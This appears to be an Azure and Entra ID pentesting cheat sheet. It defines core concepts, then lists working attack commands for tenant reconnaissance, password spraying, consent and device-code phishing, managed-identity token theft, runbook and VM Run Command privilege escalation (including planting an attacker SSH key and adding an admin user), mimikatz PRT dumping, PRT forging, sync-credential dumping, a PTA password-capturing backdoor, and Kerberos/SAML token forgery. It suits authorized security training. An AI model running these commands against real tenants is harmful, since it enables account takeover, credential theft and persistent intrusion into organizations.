


**Tenant** → An instance of Azure AD and represents a single organization.

**Management group** → helps you manage access, policy, and compliance for multiple subscriptions. All subscriptions in a management group automatically inherit the conditions that are applied to the management group.

**Subscription** → is a container that holds a collection of Azure resources, such as virtual machines and databases. It allows users/teams to manage access, usage, and costs associated with these resources.

**Resource Group** → is a logical container that holds related Azure resources, such as virtual machines, storage accounts, and databases. It allows you to manage these resources collectively, making it easier to deploy, update, and delete them as a single unit based on their shared lifecycle or purpose.

**Resource** → Actual service which could be a virtual machine, storage account, key vault, App services, Azure Functions, API services, etc.



**Azure Entra ID(Active Directory)** → Entra ID manages the authentication and authorization of identity objects like **users, groups and applications**, allowing them to access resources like Microsoft Graph API. For example, when **an application needs to send emails or access files in OneDrive, these API permissions** would be assigned in Entra ID. Entra ID facilitates **SSO, MFA and identity federation**. It handles user authentication and access across Microsoft 365 apps, third-party apps, and on-premises systems. Ex Roles - Global Administrator, Teams Administrator, Helpdesk Administrator, etc.

**Azure Resource Manager(ARM)** → Deploying and Managing Resources. Controls access to  resources through **Azure RBAC(IAM)** - Example Roles - Storage Blob Data Reader, Cosmos DB Operator, etc.

**Microsoft 365(Office 365)** → Productivity tools like SharePoint, Exchange online, OneDrive, Teams, Outlook, Word, etc.

**ARM & Microsoft 365 are closely linked to Entra ID**; For example – Identity information is stored in Entra ID. Role definitions for resources and RBAC Assignments are stored/handled in ARM.



> **Azure IAM** → Specifically for managing access to Azure resources through RBAC. Primitive Roles - **Owner, Contributor, Reader**. It controls what users, groups, service principals and managed identities can do within Azure subscriptions and resources. Ex - Key Vault Secrets User, Virtual Machine Contributor.
> 

> **Service Principal** → represents an application or service that has been granted explicit permissions to access Azure resources. Suitable for applications that run outside of Azure or require specific configurations, such as CI/CD pipelines or third-party applications needing access to Azure resources. Credentials must be manually created and configured by the user - **Client ID, Secret or Certificate**.
> 

> **Managed Identity** → It is automatically created and managed by Azure for Azure resources. It allows these resources(ex. APP Services) to authenticate to other Azure services(ex. Keyvault) without the need for manual credential management, enhancing security by eliminating hardcoded secrets. This service comes in two forms: **system-assigned**(tied to a single resource) and **user-assigned**(can be shared across multiple resources).
> 

> **Enterprise Applications** → is a large-scale software solution designed to meet the complex needs of an organization, facilitating various business processes and operations across departments. Ex: Microsoft 365 app, Salesforce, SAP, Workday, ServiceNow, Zoom, etc. We can assign user/group to those applications through Entra ID.
> 


## Tools

Azure CLI

Az PowerShell Module - [https://github.com/Azure/azure-powershell](https://github.com/Azure/azure-powershell)

AzureAD PowerShell Module - [https://www.powershellgallery.com/packages/AzureAD/2.0.2.182](https://www.powershellgallery.com/packages/AzureAD/2.0.2.182) (Deprecated)

Microsoft Graph PowerShell Module - [https://www.powershellgallery.com/packages/Microsoft.Graph](https://www.powershellgallery.com/packages/Microsoft.Graph)

AzureHound - https://github.com/SpecterOps/AzureHound 

Stormspotter - https://github.com/Azure/Stormspotter 

Monkey365 - https://github.com/silverhack/monkey365 

GraphRunner - https://github.com/dafthack/GraphRunner 

TeamFiltration - https://github.com/Flangvik/TeamFiltration 

TokenSmith - https://github.com/JumpsecLabs/TokenSmith


## Reconnaissance

#### Get login Information of the Organization - Authentication type and Tenant ID 

<aside>
📢 Find Authentication Type:
      1. Managed(Azure AD)
      2. Federated(SAML/ADFS)
      3. MicrosoftAccount

</aside>

```powershell
# In the XML response, the NameSpaceType field would contain any of the Authentication Types listed above

https://login.microsoftonline.com/getuserrealm.srf?login=[USERNAME@DOMAIN]&xml=1
```

<aside>
📢 Get Tenant ID

</aside>

```powershell
# In the returned JSON, the issuer field contains the tenant ID as part of the URL (e.g., https://sts.windows.net/{tenantId}/).

https://login.microsoftonline.com/[DOMAIN]/.well-known/openid-configuration
```

#### AADInternals - [GitHub - Gerenios/AADInternals: AADInternals PowerShell module for administering Azure AD and Office 365](https://github.com/Gerenios/AADInternals)

<aside>
📢 This function returns login information(authentication, tenant name) for the given user or domain:

</aside>

```powershell
Get-AADIntLoginInformation -UserName test@organization.onmicrosoft.com
```

<aside>
📢 This function returns tenant id for the given user, domain, or Access Token:

</aside>

```powershell
Get-AADIntTenantID -Domain organisation.onmicrosoft.com
```

<aside>
📢 This function returns all registered domains from the tenant of the given domain. Uses ‘AutoDiscover’ API.
</aside>

```powershell
Get-AADIntTenantDomains -Domain organization.com
```

<aside>
📢 This function returns all verified domains of the tenant along with their types

</aside>

```powershell
Invoke-AADIntReconAsOutsider -DomainName organization.onmicrosoft.com
```

<aside>
📢 This function checks whether the given user exists in Azure AD or not. Uses ‘GetCredentialType’ API and ‘Autologon’(Queries are not Logged) API Endpoints.

</aside>

```python
# Invoke user enumeration as an outsider using a text file
Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider
```



#### MicroBurst [GitHub - NetSPI/MicroBurst: A collection of scripts for assessing Microsoft Azure security](https://github.com/NetSPI/MicroBurst)

<aside>
📢 This script takes a base word and a list of permutations and enumerates several ‘Azure services’ for potential targets:

</aside>

```powershell
Invoke-EnumerateAzureSubDomains -Base organization -Verbose
Invoke-EnumerateAzureSubDomains -Base "netspi" -Permutations ".\permutations.txt"
```

<aside>
📢 This script takes a base word and prefixes/suffixes it with a list of words to identify any valid “.blob.core.windows.net” host names associated with the target via DNS. After completing storage account enumeration, the function then checks for valid containers via the Azure REST API methods. If a valid container has public files, the function will list them out.

</aside>

```powershell
Invoke-EnumerateAzureBlobs -Base "netspi" -Permutations ".\permutations.txt"
```

## Initial Access

### Password Spraying

<aside>
📢 Spray against Microsoft Online accounts (Azure/O365). This script logs if a user credential is valid, if a user or tenant doesn't exist, if the account has MFA enabled, is locked, or disabled.

</aside>

```powershell
# https://github.com/dafthack/MSOLSpray

Import-Module MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\userlist.txt -Password "Winter2020"
```



<aside>
📢 Password spraying Outlook Web Access and Exchange Web Services:

</aside>

```jsx
# https://github.com/dafthack/MailSniper/blob/master/MailSniper.ps1

Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password "Fall2016" -Threads 15 -OutFile owa-sprayed-creds.txt

Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password "Fall2016" -Threads 15 -OutFile ews-sprayed-creds.txt
```



### Illicit Consent Grant Attack

<aside>
📢 Attackers deceive individuals by sending phishing emails with links to fraudulent Azure-registered applications that request access to sensitive data like emails and documents; Once consent is given, they gain account-level access to the victim's data without needing their credentials, allowing actions such as reading emails and uploading OneDrive files on the victim's behalf. This access can last for up to 90 days if undetected.

</aside>




```powershell
# Check if users are allowed to consent to apps ?
# https://www.powershellgallery.com/packages/AzureADPreview/2.0.2.183

(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole

```

<aside>

#### 365-stealer [GitHub - AlteredSecurity/365-Stealer: 365-Stealer is a phishing simualtion tool written in python3. It can be used to execute Illicit Consent Grant Attack.](https://github.com/AlteredSecurity/365-Stealer)

- Register an Azure Application and configure Microsoft Graph API permissions(Delegated) to ‘Read and Write’ to Mail, Files, User, Contacts, etc. on behalf of a victim user.
- Then configure 365-stealer with the client ID, Secret and Redirect URL of the registered application to execute the attack.

</aside>



### Phishing

**Device Code Authentication:**

> allows users to sign in to input-constrained devices such as a smart TV, IoT device, or printer. To enable this flow, the device has the user visit a webpage in their browser on another device to sign in. Once the user signs in, the device is able to get access tokens and refresh tokens as needed.
> 

```powershell

az login --use-device-code

```



<aside>
📢 Device code phishing -

- Involves an attacker connecting to the ‘/devicecode’ Microsoft OAuth endpoint with ‘client_id’ and ‘scope’ to generate a ‘user_code, device_code and verification_URI’.
- ‘User_code’ along with the ‘verification_URI’ is sent in a phishing email to the victim, who is then tricked into entering the code on a legitimate Microsoft login page
- Upon successful authentication, the attacker obtains ‘access_token’ and ‘refresh_token’ by hitting the ‘/token’ endpoint along with ‘device_code’ that allows them to impersonate the victim.
- Useful Tool -> TokenTactics [GitHub - rvrsh3ll/TokenTactics: Azure JWT Token Manipulation Toolset](https://github.com/rvrsh3ll/TokenTactics)
</aside>




**Evilginx Phislets:**

#### evilginx2 [GitHub - kgretzky/evilginx2: Standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication](https://github.com/kgretzky/evilginx2)

- **Evilginx** is a man-in-the-middle reverse-proxy attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication.
- https://help.evilginx.com/community/getting-started/quickstart
- Phishlets are small configuration files, used to configure **Evilginx** for targeting specific websites such as O365.
- https://github.com/kgretzky/evilginx2/wiki/Phishlet-File-Format-(2.3.0)
- [http://raw.githubusercontent.com/kgretzky/evilginx2/refs/heads/master/phishlets/example.yaml](http://raw.githubusercontent.com/kgretzky/evilginx2/refs/heads/master/phishlets/example.yaml)
- Lures are essentially pre-generated phishing links, which you will be sending out on your engagements. **Evilginx** provides multiple options to customize your lures.




### Web App Vulnerability → Retrieve Access Token

> **Azure Managed Identity** is a security feature that eliminates the need to store credentials in the code by automatically handling authentication between Azure services. It acts as an automatic ID card for your applications, allowing apps to securely access other Azure resources (like databases, storage, or Key Vault) without hardcoding passwords or connection strings.
> 

> The ‘**Identity Endpoint**’ and ‘**Identity Header**’ are components used by Azure App services or Azure Functions to obtain access tokens for accessing other resources. The Identity Endpoint is a local URL (typically http://169.254.169.254/metadata/identity) accessible only from within an Azure resource, while the Identity Header(**X-IDENTITY-HEADER**) value is obtained from an **environment variable(IDENTITY_HEADER)** which is automatically set by the Azure platform for App Services or Azure Functions. Together, they form a secure way for your application to request access tokens without storing credentials. **Access token** is a secure, time-limited credential issued by Azure Entra ID(Azure AD) after successful authentication by User/App, that contains information about **who you are and what you're allowed to access**.
> 

1. App → Uses Managed Identity Secret Token → IMDS
2. IMDS → Validates Managed Identity → Returns Access Token
3. App → Uses Access Token → Azure Services (Storage, SQL, etc.)

<aside>
📢 If there is command execution vulnerability in the application, retrieve access token associated with the managed identity:

</aside>

```bash
curl "$IDENTITY_ENDPOINT/oauth2/token?resource=https://management.azure.com&api-version=2018-02-01" -H X-IDENTITY-HEADER:$IDENTITY_HEADER -H Metadata:true

**Resource** parameter can be →

- [https://storage.azure.com]
- [https://vault.azure.net]
- [https://graph.microsoft.com]
- [https://management.azure.com]
```

<aside>
📢 Using the retrieved token, we can query the Azure REST API Endpoints or use other tools to fetch additional information and escalate privileges if possible:

</aside>

```powershell
$TOKEN = ''
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
Method  = 'GET'
Uri = $URI
Headers = @{ 'Authorization' = "Bearer $Token"}
}
(Invoke-RestMethod @RequestParams).value

# $URI = 'https://graph.microsoft.com/v1.0/applications'
```

### Storage Account

<aside>
📢 What can be done?

- Read sensitive blobs/files from containers
- Write malicious files into storage
- Delete or modify existing resources
- List and enumerate storage contents
</aside>

```powershell
# MicroBurst 
Invoke-EnumerateAzureBlobs -Base "testcorp"
```

**Shared Access Signature (SAS):**

> Shared Access Signature (SAS) is used to provide delegated access to azure storage without sharing the primary storage account credentials. It's a URI that grants limited, time-bound access to Azure storage resources.
> 

<aside>
📢 SAS Tokens can be found in 

- Leaked Configuration Files
- Improperly secured GitHub repositories
- Employee Communication Channels
</aside>



## Post Exploitation

### Enumerate ->

- RBAC Roles in IAM
- Application Ownership, App Permissions
- Directory Roles
- Group Ownership
- KeyVaults, Storage Accounts, Deployment Files, Metadata, PowerShell History, etc.
- Dynamic Groups
- Application Proxy

```powershell
az role assignment list
az ad signed-in-user list-owned-objects
Get-MgUserOwnedobject
```

```powershell
# Check for Credentials

Get-AzResourceGroupDeployment -ResourceGroupName "Prod-RG"
Save-AzResourceGroupDeploymentTemplate -ResourceGroupName "Prod-RG" -DeploymentName "testdeploy"
```

```powershell
Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}
Set-AzureADUser -objectId "" -OtherMails "*pattern*" -Verbose
```




### Automation Account

> Azure Automation Account is a centralized platform for managing, scheduling, and executing automated scripts (runbooks) across Azure services, supporting cross-platform and hybrid cloud automation tasks. Uses **Managed Identities** for access.
> 

```powershell
# Privilege Escalation
# For example - Attacker has the permissions to modify/publish runbooks and the automation account(managed identity) has a privileged role assigned to it at the subscription level

az automation runbook create --resource-group "RG-Name" --automation-account-name "Prod-Auto" --name "privescrunbook" --type PowerShell --location "East US"

az automation runbook replace-content --resource-group "RG-Name" --automation-account-name "Prod-Auto" --name "privescrunbook" --content @./home/devuser/privesc.ps1

az automation runbook publish --resource-group "RG-Name" --automation-account-name "Prod-Auto" --name "privescrunbook"

# privesc.ps1
New-AzRoleAssignment -ObjectId "" -RoleDefinitionName Owner -Scope "/subscriptions/<subscription-id>"
New-AzRoleAssignment -SignInName "test@domain.com" -RoleDefinitionName Owner -Scope "/subscriptions/<subscription-id>"
```

```powershell
# Run Script across Worker Group Machines

Get-AzAutomationHybridWorkerGroup -AutomationAccountName "HybridAutomation" -ResourceGroupName "Engineering"

Import-AzAutomationRunbook -Name "adduser" -Path "C:\Tools\adduser.ps1" -AutomationAccountName "HybridAutomation" -ResourceGroupName "Engineering" -Type PowerShell -Force -Verbose

Publish-AzAutomationRunbook -RunbookName "adduser" -AutomationAccountName "HybridAutomation" -ResourceGroupName "Engineering" -Verbose

Start-AzAutomationRunbook -RunbookName "adduser" -RunOn "Workergroup1" -AutomationAccountName "HybridAutomation" -ResourceGroupName "Engineering" -Verbose

```

```powershell
# Look for Secrets

Get-AzAutomationRunbook -ResourceGroupName "RD-RG" -AutomationAccountName "RD-Automation"

Export-AzAutomationRunbook -ResourceGroupName "RD-RG" -AutomationAccountName "RD-Automation" -Name "RD-Runbook" -Slot "Published" -OutputFolder "." -verbose
```

---

### VM ‘Run Command’ Permissions

- Run Command uses the virtual machine (VM) agent to run scripts within an Azure Windows or Linux VM. You can use these scripts for general machine or application management.
- They can help you to quickly diagnose and remediate VM access and network issues and get the VM back to a good state.
- Two Types of commands – 1) Action and 2)Managed.

```powershell

az vm run-command invoke -g "IT-RG" -n "it-vm" --command-id "RunShellScript" --scripts "echo 'ssh-ed25519 AAAAC2NxaC1lZDI1NGW5AAAAIAhqbwOnFPr3iJTbq+uqEOAONkytbBwcounZo98wamUq attacker' >> /home/ituser/.ssh/authorized_keys"
```

```powershell
Invoke-AzVMRunCommand -VMName "Prod-vm" -ResourceGroupName "Prod-RG" -CommandId 'RunPowerShellScript' -ScriptPath 'C:\Tools\adduser.ps1' -Verbose

Set-AzVMRunCommand -ResourceGroupName MyRG -VMName MyVM -RunCommandName MyRunCommand -Location EastUS2EUAP -SourceScriptUri <SourceScriptUri> -AsyncExecution -TimeoutInSecond 6000
```

---

### VM → Extensions/write Permissions

> Azure virtual machine (VM) extensions are small applications that provide post-deployment configuration and automation tasks on Azure VMs. 
>
> The Azure platform hosts many extensions covering VM configuration, monitoring, security, and utility applications. 
>
> For example, if a virtual machine requires software installation, antivirus protection, or the ability to run a script inside it, you can use a VM extension.
> 

```powershell
Get-AzVMExtension -ResourceGroupName "Research" -VMName "RD-VM"
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "RD-VM" -Location "East US" -Publisher "Microsoft.Compute" -ExtensionType "CustomScriptExtension" -TypeHandlerVersion "1.8" -SettingString '{"commandToExecute":"powershell net user testuser testuserPassword@123 /add /Y; net localgroup administrators testuser /add"}'

Set-AzVMCustomScriptExtension -ResourceGroupName "<myResourceGroup>" -VMName "<myVM>" -Name "<myCustomScript>" -FileUri "https://raw.githubusercontent.com/<test>/<test>/master/windows-support-script-simple/add-user.ps1" -Run "add-user.ps1" -Location "<myVMregion>"
```



---

### PRT - Primary Refresh Token

**Primary Refresh Token(PRT)** is issued to **a device that is Entra ID joined, or Hybrid joined when an Entra ID user(either cloud-only or synced from on-prem) signs in**. It is used to facilitate Single Sign-On(SSO) to Entra ID connected resources. 

A Primary Refresh Token(PRT) is a key artifact of Microsoft Entra authentication in supported versions of Windows, iOS, and Android. It is a JSON Web Token(JWT) specially issued to Microsoft first party token brokers to enable single sign-on(SSO) across the applications used on those devices. When we decode this JWT, it contains the **PRT itself and a nonce**, which ties the cookie to the current login that is being performed. It won’t accept a JWT with a different nonce.

Once issued, a PRT is valid for **14 days** and is continuously renewed as long as the user actively uses the device. Unlike normal access and refresh tokens, PRT can be used to authenticate to any application. PRT can get updated with an MFA claim when MFA is used on the device, which enables SSO to resources requiring MFA afterwards. **If the PRT was issued with MFA, the corresponding access token also has the MFA claim**. Thus, PRT is more valuable from attacker’s perspective and can be used for persistent access.

#### ROADtools - [GitHub - dirkjanm/ROADtools: A collection of Azure AD/Entra tools for offensive and defensive security purposes](https://github.com/dirkjanm/ROADtools)


```powershell

# Request Nonce
roadrecon auth --prt-init

# From Azure AD Joined Device - Get PRT Token
# ROADToken uses 'Browsercore.exe' here to fetch PRT
ROADToken.exe <nonce>

# The generated token can be used either as a cookie or http request header -> x-ms-RefreshTokenCredential

# Also, the generated token can be used to generate access tokens to connect to Azure AD or Microsoft Graph:
Get-AADIntAccessTokenFor<service> -PRTToken $prtToken
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken

roadrecon auth --prt-cookie <prt_cookie>

Connect-AzureAD --AadAccessToken <token> --AccountId <acc_id>

```

```powershell

**Dumping PRT**
# https://aadinternals.com/post/prt/

mimikatz # privilege::debug
mimikatz # sekurlsa::cloudap
mimikatz # token::elevate

# Unprotect the Session key to get Clear Key
mimikatz # dpapi::cloudapkd /keyvalue:AQAAAAEAAAABAAAA0Iyd3wEV0RGMegDAT8KX6...a_uuJVo86iywLqs0yh0sHCsGKd0rgqWrrQGMEQSSeq9E0znadE /unprotect

# Add the PRT to a variable
$MimikatzPRT = "MC5BQUFBeGt3RFJMN19mRVNvbms3SXhzaTc3b2M3cWpodG9...aG1ianRuMk83QmtJdkg0QXNVRXp6dWhQX3ZwZ2ZNLWppYw"

# Add padding
while($MimikatzPRT.Length % 4) {$MimikatzPRT += "="}

# Convert from Base 64
$PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Add the session key (Clear key) to a variable
$MimikatzKey = "e5268ef434fb624db4b133cf9f0854d73d367284b0f39543810587afd5d4178d"

# Convert to byte array and base 64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate a new PRTToken with nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken -SaveToCache

# Generate a new P2P certificate
New-AADIntP2PDeviceCertificate -RefreshToken $PRT -SessionKey $SKey

```

```powershell

**Device registration - Generate our OWN PRT**

# Get an access token for AAD join service and save to cache
# Under the hood, it makes a request with Client ID as MS Graph - '1b730954-1685-4b74-9bfd-dac224a7b894' for the Device Registration Service(01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9) Resource/Audience
# https://learn.microsoft.com/en-us/troubleshoot/entra/entra-id/governance/verify-first-party-apps-sign-in#application-ids-of-commonly-used-microsoft-applications
# Will prompt for credentials and MFA
Get-AADIntAccessTokenForAADJoin -SaveToCache

# Registering a device requires an access token to the device registration service resource. The access token must be a token without a device claim, so you cannot use single sign-on or an existing PRT to request one. 
roadtx gettokens --device-auth -r devicereg

# Join a non-existent device to Azure AD
# The device gets registered and the corresponding certificate is saved to the current directory.
Join-AADIntDeviceToAzureAD -DeviceName "" -DeviceType "" -OSVersion "C64"

roadtx device -n <device_name>

# Get the PRT keys using the device certificate
$prtKeys = Get-AADIntUserPRTKeys -PfxFileName .\<DeviceId>.pfx

# Generate a new PRTToken using the PRT keys
$prtToken = New-AADIntUserPRTToken -Settings $prtKeys -GetNonce

roadtx prt -u myuser@mytenant.com -p password --key-pem <device_name>.key --cert-pem <device_name>.pem
roadtx prt -a renew

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken -SaveToCache

# By default, the roadtx prtauth module will use the Azure AD PowerShell Module client ID and the Azure AD graph as resource
roadtx prtauth -c azcli -r azrm  

# Get the P2P device certificate which could be used to laterally access other Azure AD joined computers of the same tenant
New-AADIntP2PDeviceCertificate -PfxFileName .\<device-id>.pfx -TenantId <tenant-id> -DeviceName ""

# Set the authentication methods
Set-AADIntDeviceRegAuthMethods -DeviceId "" -Methods pwd,rsa,mfa

```

---

### Intune

>**Microsoft Intune** - is a cloud-based Enterprise Mobility Management(EMM) solution that enables organizations to manage and secure devices, enforce compliance policies, and control application access across platforms like Windows, Android, iOS, Linux Ubuntu Desktop and macOS. It integrates with Microsoft 365 to provide Unified Endpoint Management(UEM) with features like MDM and MAM.
>

<aside>
📢 What can be done?

- Push Malicious Applications to managed devices
- Run PowerShell Scripts with System Privileges
- Modify Security Policies
</aside>

#### PowerZure - [GitHub - hausec/PowerZure: PowerShell framework to assess Azure security](https://github.com/hausec/PowerZure)


```powershell
Get-AzureInTuneScript

New-AzureIntuneScript -Script 'C:\temp\test.ps1'

```
---

### Entra Connect

```powershell
# Check the device's Entra ID join status
dsregcmd /status

# Server where ADSync Service is running. Requires MSOnline module
(Get-MsolCompanyInformation).DirSyncClientMachineName

# List all connectors (both on-prem AD and cloud Ent ID) configured in the synchronization engine
Get-ADSyncConnector
```

PHS - Password Hash Synchronization →

```powershell
# Dump the high-privileged Entra Connect 'SYNC_***' account credential on the OnPrem Server where ADSync service is running
Import-Module AADInternals
Get-AADIntSyncCredentials

Get-AADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache

# Get the ImmutableId (OnPrem AD Object GUID) of user that we want to compromise
Get-AADIntUser -UserPrincipalName privuser@org.onmicrosoft.com | select ImmutableId

# Force-reset the target privileged user's cloud password
Set-AADIntUserPassword -SourceAnchor "b2JqZWN0R1VJRAo=" -Password "" –Verbose
```

#### DumpAADSyncCreds - [GitHub - Hagrid29/DumpAADSyncCreds: C# implementation of Get-AADIntSyncCredentials from AADInternals, which extracts Azure AD Connect credentials to AD and Azure AD from AAD connect database.](https://github.com/Hagrid29/DumpAADSyncCreds)
```powershell
# Copy token of ADSync service account and dump AAD connect account credential
DumpAADSyncCreds.exe get_token

```



PTA - PassthroughAuthPSModule →

```powershell
# Check if Pass-Through Authentication PowerShell module is installed
Get-Command -Module PassthroughAuthPSModule

# Install a backdoor into the PTA agent to intercept and log all authentication credentials
Install-AADIntPTASpy

# Retrieve and display captured plaintext passwords from the PTASpybackdoor
Get-AADIntPTASpyLog -DecodePasswords
```

AzureADSSOACC →

```powershell
# Extract the NT hash and Kerberos keys of the Entra ID Seamless SSO computer account - 'AZUREADSSOACC$' through DCSync or any other means

# Forge a Kerberos ticket for the target user using the stolen SSO account hash
$kerberos = New-AADIntKerberosTicket -SidString "Impersonated User SID" -Hash "AzureADSSOACC$ Computer Account Hash"

# Use the forged ticket to get access token for specific services such as Entra ID Graph, Sharepoint, Outlook, OneDrive, etc. on behalf of the impersonated user
$at = Get-AADIntAccessTokenForAADGraph -KerberosTicket $kerberos -Domain "company.com" -SaveToCache

# Get an access token for Exchange Online
$et=Get-AADIntAccessTokenForEXO -KerberosTicket $kerberos -Domain company.com

```

ADFS →

```powershell
# Export the ADFS token-signing certificate (private key) from the AD FS configuration database
Export-AADIntADFSSigningCertificate

# Get the target user's ImmutableId (SourceAnchor) by base64-encoding their on-prem AD ObjectGUID
[System.Convert]::ToBase64String((Get-ADUser -Identity onpremuser -Server 10.1.1.5 -Credential $creds | select -ExpandProperty ObjectGUID).tobytearray())

# Forge a SAML token using the stolen ADFS certificate and log in as the target
Open-AADIntOffice365Portal -ImmutableID "b2JqZWN0R1VJRAo=" -Issuer "http://company.com/adfs/services/trust" -PfxFileName "C:\users\pentest\Documents\ADFSSigningCertificate.pfx" -Verbose
```

---
**Reference**

- https://aadinternals.com/
- https://dirkjanm.io/
- Pentester Academy
- Cyberwarfare Labs


